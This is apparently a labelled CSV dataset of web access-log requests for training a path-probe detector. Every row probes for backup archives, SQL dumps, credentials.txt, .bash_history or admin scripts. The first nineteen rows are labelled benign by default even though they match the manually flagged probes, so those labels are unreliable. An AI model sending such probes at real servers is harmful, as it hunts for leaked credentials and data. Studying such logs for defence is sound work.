source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T12:50:55-08:00,45.86.200.141,HEAD,/restore/www.sql,,/restore/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:55:50-08:00,85.203.34.147,HEAD,/bak/sql.sql,,/bak/sql.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:40-08:00,185.195.237.149,HEAD,/backups/backup.rar,,/backups/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:02:45-08:00,98.159.226.25,HEAD,/backups/sftp-config.json,,/backups/sftp-config.json,HTTP/1.1,301,191,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:26:27-08:00,45.86.200.120,HEAD,/backup/secrepo.com.sql,,/backup/secrepo.com.sql,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:37-08:00,185.192.70.17,HEAD,/restore/directory.rar,,/restore/directory.rar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:56:15-08:00,194.169.217.212,HEAD,/backups/www.rar,,/backups/www.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:32:11-08:00,45.134.22.48,HEAD,/old/directory.tar,,/old/directory.tar,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:04:57-08:00,85.203.45.190,HEAD,/old/config.json,,/old/config.json,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:37:53-08:00,212.30.33.38,HEAD,/back/website.tar,,/back/website.tar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:22-08:00,45.67.99.141,HEAD,/back/credentials.txt,,/back/credentials.txt,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:29:17-08:00,185.195.237.146,HEAD,/bak/backup.tar,,/bak/backup.tar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:17:45-08:00,98.159.226.16,HEAD,/backup/website.tar,,/backup/website.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:14:05-08:00,185.192.16.36,HEAD,/backup/.bash_history,,/backup/.bash_history,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:50:34-08:00,45.128.199.99,HEAD,/bak/credentials.txt,,/bak/credentials.txt,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:10:10-08:00,45.130.202.91,HEAD,/bak/dump.sql,,/bak/dump.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:12:57-08:00,212.30.36.82,HEAD,/old/www.tar,,/old/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:04:45-08:00,45.134.22.152,HEAD,/backup/backup.sql.tar,,/backup/backup.sql.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:51:25-08:00,98.159.226.30,HEAD,/restore/secrepo.com.rar,,/restore/secrepo.com.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/backup.gz,,/backups/backup.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求备份压缩包路径，属于备份文件探测，建议回流到已知类,METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/bak/secrepo.com.tar.gz,,/bak/secrepo.com.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 tar.gz 备份包路径，属于备份泄露探测,METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/self.logs/,,/self.logs/,HTTP/1.1,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",suspicious_path_probe,manual_backflow,直接浏览 self.logs 目录，属于敏感目录探测,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.tar.gz,,/restore/directory.tar.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 请求 restore 目录下 tar.gz，属于备份文件探测,METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/public_html.zip,,/restore/public_html.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/directory.zip,,/restore/directory.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/application.zip,,/old/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/latest.zip,,/backup/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/back/application.zip,,/back/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/Archive.zip,,/backups/Archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/bak.zip,,/old/bak.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/backup.zip,,/restore/backup.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/backup.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/archive.zip,,/old/archive.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/old/archive.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/backup.sql.zip,,/backup/backup.sql.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 backup.sql.zip，属于数据库备份探测,METHOD=HEAD PATH=/backup/backup.sql.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/restore/bak.gz,,/restore/bak.gz,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/old/credentials.txt,,/old/credentials.txt,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测 old/credentials.txt，属于敏感文件探测,METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backup/www.zip,,/backup/www.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backup/www.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/latest.zip,,/backups/latest.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,HEAD,/backups/application.zip,,/backups/application.zip,HTTP/1.1,,,,-,suspicious_path_probe,manual_backflow,HEAD 探测备份/凭证/压缩包路径，属于已知敏感路径探测,METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/images/vuln.php,,/images/vuln.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,vuln.php 命名更像漏洞/后门文件探测，建议归到路径探测,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1
review_backflow,,,GET,/media-admin.php,,/media-admin.php,HTTP/1.1,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",suspicious_path_probe,manual_backflow,探测 media-admin.php，属于后台/敏感脚本路径探测,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1
